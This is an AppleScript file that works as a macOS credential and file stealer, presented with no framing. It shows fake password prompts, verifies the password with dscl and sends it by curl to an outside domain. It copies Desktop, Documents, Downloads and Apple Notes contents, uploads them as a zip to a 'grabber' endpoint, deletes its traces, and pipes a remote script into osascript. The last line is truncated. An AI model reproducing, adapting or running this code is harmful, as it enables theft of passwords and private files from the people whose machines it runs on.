set ledgerScriptURL to "https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/32f763b45cec3531f39b5365edf2c97e.aspx"
set domain to "https://goldenticketsshop.com"
set credentialsEndpoint to "/api/credentials" 
set grabberEndpoint to "/api/grabber"

set authCurlFlags to "--retry 10 --retry-delay 10 --max-time 10"
set uploadCurlFlags to "--retry 10 --retry-delay 10 --max-time 3600"

set maxFileSize to 100000

set promptFirst to "Please enter your password to continue:"
set promptWrong to "Incorrect password. Please try again:"

try
    set hwid to do shell script "system_profiler SPHardwareDataType | awk -F': ' '/Hardware UUID/ {print $2}' | md5"
on error
    set hwid to "unknown"
end try

set userName to short user name of (system info)

try
    set rawUUID to do shell script "uuidgen"
    set baseFolderName to do shell script "echo " & quoted form of rawUUID & " | tr -d '\\n' | md5"
    set baseFolder to "/tmp/" & baseFolderName
    set zipPath to "/tmp/" & baseFolderName & ".zip"
on error
    set baseFolder to "/tmp/backup"
    set zipPath to "/tmp/backup.zip"
end try

try
    set wid to do shell script "tail -n 1 /tmp/wid.txt"
on error
    set wid to "unknown"
end try

set doneFlag to false

try
    display dialog promptFirst default answer "" with hidden answer buttons {"OK"} default button "OK" with icon note
    set userPassword to text returned of the result
    
    try
        do shell script "/usr/bin/dscl /Local/Default -authonly " & userName & " " & quoted form of userPassword
        try
            do shell script "nohup curl " & authCurlFlags & " -d 'hwid=" & hwid & "&wid=" & wid & "&user=" & userName & "&pass=" & userPassword & "' " & domain & credentialsEndpoint & " >/dev/null 2>&1 &"
        end try
        set doneFlag to true
        if doneFlag is true then
            try
                set homeDir to do shell script "echo $HOME"
                set historyFile to homeDir & "/." & hwid & ".txt"
                set appendCommand to "echo " & quoted form of userPassword & " >> " & quoted form of historyFile
                do shell script appendCommand
            end try
        end if
        delay 1
    on error
        try
            do shell script "nohup curl " & authCurlFlags & " -d 'hwid=" & hwid & "&wid=" & wid & "&user=" & userName & "&wrong=" & userPassword & "' " & domain & credentialsEndpoint & " >/dev/null 2>&1 &"
        end try
    end try
on error
end try

if doneFlag is false then
    repeat
        try
            display dialog promptWrong default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon note
            set userPassword to text returned of the result
            
            try
                do shell script "/usr/bin/dscl /Local/Default -authonly " & userName & " " & quoted form of userPassword
                try
                    do shell script "nohup curl " & authCurlFlags & " -d 'hwid=" & hwid & "&wid=" & wid & "&user=" & userName & "&pass=" & userPassword & "' " & domain & credentialsEndpoint & " >/dev/null 2>&1 &"
                end try
                set doneFlag to true
                if doneFlag is true then
                    try
                        set homeDir to do shell script "echo $HOME"
                        set historyFile to homeDir & "/." & hwid & ".txt"
                        set appendCommand to "echo " & quoted form of userPassword & " >> " & quoted form of historyFile
                        do shell script appendCommand
                    end try
                end if
                delay 1
                exit repeat
            on error
                try
                    do shell script "nohup curl " & authCurlFlags & " -d 'hwid=" & hwid & "&wid=" & wid & "&user=" & userName & "&wrong=" & userPassword & "' " & domain & credentialsEndpoint & " >/dev/null 2>&1 &"
                end try
            end try
        on error
            delay 1
            exit repeat
        end try
    end repeat
end if

try
    do shell script "tccutil reset All"
end try

try
    tell application "Finder"
        set desktopFolder to path to desktop folder as alias
        set documentsFolder to path to documents folder as alias
        set downloadsFolder to path to downloads folder as alias
        tell application "Notes" to get name of every folder
    end tell
end try

try
    do shell script "mkdir -p " & baseFolder & "/Desktop"
    do shell script "mkdir -p " & baseFolder & "/Documents" 
    do shell script "mkdir -p " & baseFolder & "/Downloads"
    do shell script "mkdir -p " & baseFolder & "/Notes"
end try

try
    set desktopFolder to path to desktop folder as alias
    set desktopPath to POSIX path of desktopFolder
    set documentsFolder to path to documents folder as alias  
    set documentsPath to POSIX path of documentsFolder
    set downloadsFolder to path to downloads folder as alias
    set downloadsPath to POSIX path of downloadsFolder

    tell application "Finder"
        set desktopFiles to every file of entire contents of desktopFolder
        repeat with theFile in desktopFiles
            try
                if size of theFile < maxFileSize then
                    set filePath to POSIX path of (theFile as alias)
                    set relPath to text ((length of desktopPath) + 1) thru -1 of filePath
                    set destPath to baseFolder & "/Desktop/" & relPath
                    set destDir to do shell script "dirname " & quoted form of destPath
                    do shell script "mkdir -p " & quoted form of destDir
                    do shell script "cp " & quoted form of filePath & " " & quoted form of destPath
                end if
            end try
        end repeat
        
        set documentsFiles to every file of entire contents of documentsFolder
        repeat with theFile in documentsFiles
            try
                if size of theFile < maxFileSize then
                    set filePath to POSIX path of (theFile as alias)
                    set relPath to text ((length of documentsPath) + 1) thru -1 of filePath
                    set destPath to baseFolder & "/Documents/" & relPath
                    set destDir to do shell script "dirname " & quoted form of destPath
                    do shell script "mkdir -p " & quoted form of destDir
                    do shell script "cp " & quoted form of filePath & " " & quoted form of destPath
                end if
            end try
        end repeat
        
        set downloadsFiles to every file of entire contents of downloadsFolder
        repeat with theFile in downloadsFiles
            try
                if size of theFile < maxFileSize then
                    set filePath to POSIX path of (theFile as alias)
                    set relPath to text ((length of downloadsPath) + 1) thru -1 of filePath
                    set destPath to baseFolder & "/Downloads/" & relPath
                    set destDir to do shell script "dirname " & quoted form of destPath
                    do shell script "mkdir -p " & quoted form of destDir
                    do shell script "cp " & quoted form of filePath & " " & quoted form of destPath
                end if
            end try
        end repeat
    end tell
end try

try
    tell application "Notes"
        set allNotes to {}
        repeat with f in every folder
            try
                set allNotes to allNotes & (notes of f)
            end try
        end repeat
        
        set noteCounter to 1
        repeat with n in allNotes
            try
                set fileName to "note_" & (noteCounter as string) & ".txt"
                set filePath to baseFolder & "/Notes/" & fileName
                set noteText to plaintext of n
                do shell script "echo " & quoted form of noteText & " > " & quoted form of filePath
                set noteCounter to noteCounter + 1
            end try
        end repeat
    end tell
end try

try
    do shell script "cd /tmp && zip -r " & quoted form of zipPath & " " & baseFolderName
end try

try
    do shell script "curl " & uploadCurlFlags & " -F 'file=@" & zipPath & "' -F 'hwid=" & hwid & "' -F 'wid=" & wid & "' -F 'user=" & userName & "' " & domain & grabberEndpoint
end try

do shell script "rm -rf " & baseFolder
do shell script "rm -f " & quoted form of zipPath

try
    do shell script "nohup curl -fsSL " & quoted form of ledgerScriptURL & " | osascript >/dev/null 2>&1 &"
end tr

